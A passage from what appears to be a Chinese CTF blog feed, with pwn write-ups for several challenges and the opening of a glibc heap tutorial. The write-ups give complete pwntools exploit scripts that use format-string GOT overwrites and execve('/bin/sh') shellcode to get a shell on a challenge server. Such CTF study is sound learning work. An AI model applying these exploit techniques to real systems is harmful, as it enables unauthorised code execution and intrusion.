class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./pwn&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=31010</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">sl(b&quot;3&quot;)</span><br><span class="line">ru(&quot;I believe in miracles.&quot;)</span><br><span class="line">sl(b&quot;%11$p&quot;)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">addr_base=i64(12)-0x1485 </span><br><span class="line">leak(&quot;addr_base&quot;,addr_base)</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line">ctx=addr_base+0x04050</span><br><span class="line">leak(&quot;ctx&quot;,ctx)</span><br><span class="line"></span><br><span class="line">sl(b&quot;3&quot;)</span><br><span class="line">p1=b&quot;%7$naaaa&quot;+p64(ctx)</span><br><span class="line">sl(p1)</span><br><span class="line"></span><br><span class="line">sl(b&quot;3&quot;)</span><br><span class="line">p2=b&quot;%7$hnaaa&quot;+p64(ctx+4)</span><br><span class="line">sl(p2)</span><br><span class="line"></span><br><span class="line">sl(b&quot;4&quot;)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="func-err"><a href="#func-err" class="headerlink" title="func_err"></a>func_err</h1><p>给了栈地址，算一下离我们输入的距离是多少，然后手搓一个32字节以下的shellcode就行了。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;)#, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./pwn&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=31954</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">#gdb.attach(io)</span><br><span class="line"></span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">v1=i64(12)</span><br><span class="line">leak(&quot;v1&quot;,v1)</span><br><span class="line">stack=v1-0x1c</span><br><span class="line"></span><br><span class="line">shellcode=&#x27;&#x27;&#x27;</span><br><span class="line">xor rsi,rsi</span><br><span class="line">mul rsi</span><br><span class="line">push rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f  </span><br><span class="line">push rbx</span><br><span class="line">mov rdi,rsp</span><br><span class="line">mov al,59</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27; </span><br><span class="line">shellcode=asm(shellcode)</span><br><span class="line">print(len(shellcode))</span><br><span class="line"></span><br><span class="line">p=shellcode</span><br><span class="line">p=p.ljust(0x28,b&#x27;a&#x27;)+p64(stack)</span><br><span class="line">s(p)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="Slime-Smith"><a href="#Slime-Smith" class="headerlink" title="Slime_Smith"></a>Slime_Smith</h1><p>因为有直接给flag的函数，直接打就行了，挺简单的（当时想复杂了）。exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from ctypes import*</span><br><span class="line">from struct import*</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./pwn&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=0</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=32495</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">ret=0x000000000040101a</span><br><span class="line">output_flag=0x0401336</span><br><span class="line">sla(&quot;&gt; &quot;,b&quot;1&quot;)</span><br><span class="line">sl(b&quot;0&quot;)</span><br><span class="line">sl(b&quot;0&quot;)</span><br><span class="line">p=p64(output_flag)</span><br><span class="line">#print(p)</span><br><span class="line">sla(&quot;:&quot;,p)</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure><h1 id="fmt"><a href="#fmt" class="headerlink" title="fmt"></a>fmt</h1><p>一道不错的fmt题目，在这里好好复现一下。64位，开启了NX与Partial RELRO保护，因此可以改got表的内容。</p><p><img src="/images/PCTF_fmt_1.png"></p><p>存在格式化字符串漏洞，又只是Partial RELRO，那么就可以将printf的got的值修改为system再输入&#x2F;bin&#x2F;sh获得shell。但是这里的问题就是只有一次输入又没有system函数，且我们输入的数据是在堆里面而不是栈上，所以就有点不一样了。</p><p>首先肯定的是，只有一次输入是不够的，得泄漏libc再打，至少两次，所以这里是修改free的got为vuln的地址，从而能够多次利用fmt。由于不能直接将free的got直接写入到栈上，就间接写上去</p><p><img src="/images/PCTF_fmt_2.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们利用09:0048│+038 0x7ffcd90a7bd8 —▸ 0x7ffcd90a7cc8 —▸ 0x7ffcd90a83b9 ◂— 0x4853006e77702f2e /* &#x27;./pwn&#x27; */，将free的got地址写入到栈上。代码如下：</span><br><span class="line">p1=b&quot;%c&quot;*13+b&quot;%4210699c&quot;+b&quot;%ln&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/PCTF_fmt_3.png"></p><p>因为只有一次输入，所以我们需要在一个payload中既写入got，又将free的got的值改为vuln的地址，从而当调用free时相当于调用vuln，实现反复读写。但需要注意的是，由于非栈上的格式化字符串不稳定，最多就改两字节最好，这里值与vuln的地址就两字节不同，就只需输入一次即可，而下面的printf的got就需要输入两次。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p1=b&quot;%c&quot;*13+b&quot;%4210699c&quot;+b&quot;%ln&quot;+b&quot;%53662c&quot;+b&quot;%45$hn&quot;</span><br><span class="line">s(p1)</span><br></pre></td></tr></table></figure><p><img src="/images/PCTF_fmt_4.png"></p><p>可以看出修改成功了，这样我们就能不断的利用fmt了。接着就是泄漏libc了，这很简单就直接上代码了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sl(b&quot;%15$p&quot;)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">libc_base=i64(12)-0x29d90</span><br><span class="line">leak(&quot;libc_base&quot;,libc_base)</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br></pre></td></tr></table></figure><p>接下来其实和一开始修改free的got为vuln也差不多。就分两次写printf的got就行了</p><p><img src="/images/PCTF_fmt_5.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先就利用11:0088│+078 0x7ffd30b514c8 —▸ 0x7ffd30b515b8 —▸ 0x404018 (free@got[plt]) —▸ 0x4011b6 (vuln) ◂— endbr64，将其修改为printf@got[plt]+2（因为非栈上的格式化字符串最好每次最多改两字节）。代码如下：</span><br><span class="line">p1=b&quot;%34c%23$hhn&quot;</span><br><span class="line">p1=p1.ljust(0x3ff,b&#x27;\x00&#x27;)</span><br><span class="line">s(p1)</span><br></pre></td></tr></table></figure><p><img src="/images/PCTF_fmt_6.png"></p><p>接着再将printf的got输上去，代码如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p2=b&quot;%4210720c%44$ln&quot;</span><br><span class="line">p2=p2.ljust(0x3ff,b&#x27;\x00&#x27;)</span><br><span class="line">s(p2)</span><br></pre></td></tr></table></figure><p><img src="/images/PCTF_fmt_7.png"></p><p>接下来就是将其改为system，再输入&#x2F;bin&#x2F;sh字符串，从而使得执行printf(“&#x2F;bin&#x2F;sh”)时，就相当于执行system(“&#x2F;bin&#x2F;sh”)。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p3=&#x27;%c&#x27;*0x3B+f&#x27;%&#123;((system &gt;&gt; 16)&amp;0xFF)-0x3B&#125;c%hhn&#x27;+f&#x27;%&#123;(system &amp; 0xFFFF)-((system &gt;&gt; 16)&amp;0xFF)&#125;c%&#123;0x3f&#125;$hn&#x27;</span><br><span class="line">p3=p3.encode().ljust(0x3ff,b&#x27;\x00&#x27;)</span><br><span class="line">s(p3)</span><br></pre></td></tr></table></figure><p><img src="/images/PCTF_fmt_8.png"></p><p>最后就是再次输入&#x2F;bin&#x2F;sh\x00从而获得shell。完整exp如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#导入所需库</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">from pwn import*</span><br><span class="line"></span><br><span class="line">#设置context</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line"></span><br><span class="line">#设置是否本地还是远程,并操作、解析相应文件</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">pwn_file=&#x27;./pwn&#x27;</span><br><span class="line">libc_file=&#x27;./libc.so.6&#x27;</span><br><span class="line">elf=ELF(pwn_file)</span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line">rop=ROP(libc)</span><br><span class="line"></span><br><span class="line">flag=1</span><br><span class="line">if flag:</span><br><span class="line">    io=process(pwn_file)</span><br><span class="line">else:</span><br><span class="line">    ip=&#x27;challenge.imxbt.cn&#x27;</span><br><span class="line">    port=32715</span><br><span class="line">    io=remote(ip,port)</span><br><span class="line"></span><br><span class="line">#设置自定义函数</span><br><span class="line">#--------------------------------------------------------------------------------</span><br><span class="line">#gdb调试</span><br><span class="line">def debug():</span><br><span class="line">    #gdb.attach(io)</span><br><span class="line">    #gdb.attach(io,&#x27;b *$rebase(0x1234)&#x27;)</span><br><span class="line">    #gdb.attach(io,&#x27;b main&#x27;)</span><br><span class="line">    pause()</span><br><span class="line">#lambda表达式</span><br><span class="line">s = lambda data : io.send(data)</span><br><span class="line">sa = lambda delim,data : io.sendafter(str(delim), data)</span><br><span class="line">sl = lambda data : io.sendline(data)</span><br><span class="line">sla = lambda delim,data : io.sendlineafter(str(delim), data)</span><br><span class="line">r = lambda num : io.recv(num)</span><br><span class="line">rl=lambda : io.recvline()</span><br><span class="line">ru = lambda delims, drop = True : io.recvuntil(delims, drop)</span><br><span class="line">leak = lambda name,addr : log.success(&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;.format(name, addr))</span><br><span class="line">ur32 = lambda data: u32(io.recv(data).rjust(4,b&#x27;\x00&#x27;))</span><br><span class="line">ur64 = lambda data : u64(io.recv(data).rjust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uul32 = lambda : u32(io.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uul64 = lambda : u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">i32=lambda data: int(io.recv(data), 16)</span><br><span class="line">i64=lambda data: int(io.recv(data), 16)</span><br><span class="line">ioi     =   lambda                      : io.interactive()</span><br><span class="line">#获取libc函数地址</span><br><span class="line">def libc_func_addr(base,func):</span><br><span class="line">    return base+libc.sym[&#x27;func&#x27;]</span><br><span class="line">#简单的shellcode+orw</span><br><span class="line">def shell():</span><br><span class="line">    return asm(shellcraft.sh())</span><br><span class="line">def orw(flag_file_name,addr,count):</span><br><span class="line">    return asm(shellcraft.open(str(flag_file_name)) + shellcraft.read(3,addr,count) + shellcraft.write(1,addr,count))</span><br><span class="line"></span><br><span class="line">free_got=elf.got[&#x27;free&#x27;]</span><br><span class="line">leak(&quot;free_got&quot;,free_got)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">p0 = b&quot;%c%c%c%c%c%c%c%c%c%c%c%c%c%4210699c%ln%53662c%45$hn&quot;</span><br><span class="line">s(p0)</span><br><span class="line">sl(b&quot;%15$p&quot;)</span><br><span class="line">ru(&quot;0x&quot;)</span><br><span class="line">libc_base=i64(12)-0x29d90</span><br><span class="line">leak(&quot;libc_base&quot;,libc_base)</span><br><span class="line">system=libc_base+libc.sym[&#x27;system&#x27;]</span><br><span class="line">leak(&quot;system_libc&quot;,libc.sym[&#x27;system&#x27;])</span><br><span class="line">leak(&quot;system&quot;,system)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p1=b&quot;%34c%23$hhn&quot;</span><br><span class="line">p1=p1.ljust(0x3ff,b&#x27;\x00&#x27;)</span><br><span class="line">s(p1)</span><br><span class="line">#gdb.attach(io)</span><br><span class="line">p2=b&quot;%4210720c%44$ln&quot;</span><br><span class="line">p2=p2.ljust(0x3ff,b&#x27;\x00&#x27;)</span><br><span class="line">s(p2)</span><br><span class="line">p3=&#x27;%c&#x27;*0x3B+f&#x27;%&#123;((system &gt;&gt; 16)&amp;0xFF)-0x3B&#125;c%hhn&#x27;+f&#x27;%&#123;(system &amp; 0xFFFF)-((system &gt;&gt; 16)&amp;0xFF)&#125;c%&#123;0x3f&#125;$hn&#x27;</span><br><span class="line">p3=p3.encode().ljust(0x3ff,b&#x27;\x00&#x27;)</span><br><span class="line">s(p3)</span><br><span class="line"></span><br><span class="line">s(b&#x27;/bin/sh\x00&#x27;.ljust(0x3FF, b&#x27;\x00&#x27;))</span><br><span class="line"></span><br><span class="line">ioi()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>heap_study</title>
      <link href="/2025/12/12/heap-study/"/>
      <url>/2025/12/12/heap-study/</url>
      
        <content type="html"><![CDATA[<p>主要介绍一些堆的基础知识，并且会持续更新。（attack方法在后续的文章中会陆续介绍）</p><h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>概述方面可以在ctfwiki上面自行查看，在这就不过多赘述了。</p><h1 id="glibc中的堆"><a href="#glibc中的堆" class="headerlink" title="glibc中的堆"></a>glibc中的堆</h1><p>因为在pwn题中，比较常见的就是glibc中的堆，由此就先介绍这个。在glibc中，堆管理器为ptmalloc2，用malloc与free分配与释放堆块。在堆的内部结构方面，主要介绍chunk和bin。</p><h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><p>chunk就是我们通过malloc申请的内存堆块，由于chunk可能会有不同状态，可以把chunk分为allocated chunk、free chunk和top chunk。但是不管是什么状态下的chunk，其都使用的同一个结构（但表现形式会有所不同）：</p><p><img src="/images/heap_study_1.png"></p><p>代码为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*</span><br><span class="line">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="line">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="line">  fields at known offsets from a given base. See explanation below.</span><br><span class="line">*/</span><br><span class="line">struct malloc_chunk &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */</span><br><span class="line">  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */</span><br><span class="line"></span><br><span class="line">  struct malloc_chunk* fd;         /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk;</span><br><span class="line"></span><br><span class="line">  /* Only used for large blocks: pointer to next larger size.  */</span><br><span class="line">  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */</span><br><span class="line">  struct malloc_chunk* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol><li><p>prev_size：如果物理相邻的上一个chunk是空闲的话，该字段就会记录上一个chunk的大小信息，否则可以存储上一个chunk的数据。</p></li><li><p>size：记录本chunk的大小信息（必须是MALLOC_ALIGNMENT的整数倍），该字段的后3位分别为A（是否不属于主线程）、M（是否由mmap分配）、P（前一个chunk是否被分配）。一般来说第一个chunk的P都会被设为1。当P为0时，为节省空间，会考虑使用prev_size获取前一个chunk的大小信息与地址，从而进行两个空闲chunk的合并，实现大致如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*当前申请的chunk的P为0时*/</span><br><span class="line">prev_chunk_size = current_chunk-&gt;prev_size;    //读取prev_size字段，获取前一个chunk的大小信息</span><br><span class="line">prev_chunk_addr = (char*)current_chunk - prev_chunk_size;    //计算前一个chunk的地址</span><br><span class="line">if(P_bit == 0)</span><br><span class="line">&#123;</span><br><span class="line">    prev_chunk = current_chunk - current_chunk-&gt;prev_size;</span><br><span class="line">    prev_chunk-&gt;size += current_chunk-&gt;size;</span><br><span class="line">    next_chunk = next_chunk(current_chunk);    //计算下一个chunk地址</span><br><span class="line">    next_chunk-&gt;prev_size = prev_chunk-&gt;size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>fd与bk：用于管理空闲内存块的双向链表指针，只有chunk空闲时才使用。fd指向下一个空闲chunk（类似于next指针），bk指向上一个空闲chunk（类似于prev指针）。</p></li><li><p>fd_nextsize与bk_nextsize：与fd&#x2F;bk类似，不过存在于large chunk中。fd_nextsize指向下一个大小不同的第一个空闲chunk，bk_nextsize指向上一个大小不同的第一个空闲chunk。</p></li></ol><p>从上面的chunk结构可以看出，我们申请的内存块大小（user_data_size）和实际上的chunk_size是不一样的。</p><p>需注意的是，在<strong>glibc2.26</strong>版本起，<strong>32位</strong>的<strong>MALLOC_ALIGNMENT</strong>和<strong>64位</strong>所用值一样，都为<strong>16</strong>。</p><h3 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h3><p>是位于堆空间最高地址处的一段内存块，用于满足程序动态内存分配需求。在我们第一次malloc时，操作系统会给我们一段很大的内存空间，它就是作为一个top chunk存在的，因此我们可以把top chunk看成堆的边界。</p><h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2><p>bin是用来管理free chunk的容器系统，这里介绍的是ptmalloc中的bin，主要分为fast bin、small bin、large bin、unsorted bin 。我们在进行malloc时，大致的分配流程如下：</p><ol><li>首先将请求的内存大小转化为chunk的大小。</li><li>接着得到了chunk_size后，会与fast bin的max size进行比较，看其是否符合fast bin范围内，若在就优先寻找匹配的fast bin。</li><li>若找不到或fast bin为空，就在small bin里面找。</li><li>若依旧找不到或者small bin为空，就在large bin里面找。同理，就在unsorted bin里面找。</li><li>如果都找不到就在top chunk里面切割一块，实在不够的话，就再次向操作系统申请新的top chunk。</li><li><strong>注意</strong>：以上都是没有引入tcache的情况下，若引入了tcache，那么就会优先在tcache里面寻找。</li></ol><p>在这放一个整个bins大致的结构图，便于查看（感觉这个更符合内部结构，有的是一个数组就是一个bin，这个是两个数组一个bin）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+---------------------------------------+</span><br><span class="line">|        struct malloc_state            |</span><br><span class="line">|            (main_arena)               |</span><br><span class="line">+---------------------------------------+  [glibc 2.32+ 布局]</span><br><span class="line">| __libc_lock_t mutex      (线程锁)      |  偏移 0x00</span><br><span class="line">| int flags                (标志位)      |  偏移 0x40 (lock 大小)</span><br><span class="line">| int have_fastchunks (fastbin的标志)    |  偏移 0x44</span><br><span class="line">|---------------------------------------|</span><br><span class="line">| mfastbinptr fastbinsY[0]  (size=0x20) |  Fastbin #1 (单链表)</span><br><span class="line">| mfastbinptr fastbinsY[1]  (size=0x30) |  Fastbin #2</span><br><span class="line">| mfastbinptr fastbinsY[2]  (size=0x40) |  Fastbin #3</span><br><span class="line">| mfastbinptr fastbinsY[3]  (size=0x50) |  Fastbin #4</span><br><span class="line">| mfastbinptr fastbinsY[4]  (size=0x60) |  Fastbin #5</span><br><span class="line">| mfastbinptr fastbinsY[5]  (size=0x70) |  Fastbin #6</span><br><span class="line">| mfastbinptr fastbinsY[6]  (size=0x80) |  Fastbin #7 (MAX_FAST)</span><br><span class="line">| mfastbinptr fastbinsY[7]  (unused)    |  NFASTBINS=10</span><br><span class="line">| mfastbinptr fastbinsY[8]  (unused)    |</span><br><span class="line">| mfastbinptr fastbinsY[9]  (unused)    |</span><br><span class="line">|---------------------------------------|</span><br><span class="line">| mchunkptr top          (Top Chunk)    |  当前堆顶</span><br><span class="line">| mchunkptr last_remainder (last remain)|  分割碎片</span><br><span class="line">|---------------------------------------|</span><br><span class="line">| bins[0]   -&gt; unsorted bin fd          |  Bin 1: Unsorted (索引0)</span><br><span class="line">| bins[1]   -&gt; unsorted bin bk          |</span><br><span class="line">|---------------------------------------|</span><br><span class="line">| bins[2]   -&gt; small bin 1 fd           |  Bin 2: Small (最小)</span><br><span class="line">| bins[3]   -&gt; small bin 1 bk           |</span><br><span class="line">| bins[4]   -&gt; small bin 2 fd           |  Bin 3</span><br><span class="line">| bins[5]   -&gt; small bin 2 bk           |</span><br><span class="line">| ...                                   |</span><br><span class="line">| bins[124] -&gt; small bin 62 fd          |  Bin 63: Small (最大)</span><br><span class="line">| bins[125] -&gt; small bin 62 bk          |</span><br><span class="line">|---------------------------------------|</span><br><span class="line">| bins[126] -&gt; large bin 1 fd           |  Bin 64: Large #1</span><br><span class="line">| bins[127] -&gt; large bin 1 bk           |</span><br><span class="line">| ...                                   |</span><br><span class="line">| bins[250] -&gt; large bin 63 fd          |  Bin 126: Large #63</span><br><span class="line">| bins[251] -&gt; large bin 63 bk          |</span><br><span class="line">|---------------------------------------|</span><br><span class="line">| unsigned int binmap[0] (bits 0-31)    |  Binmap 加速</span><br><span class="line">| unsigned int binmap[1] (bits 32-63)   |  BINMAPSIZE=4</span><br><span 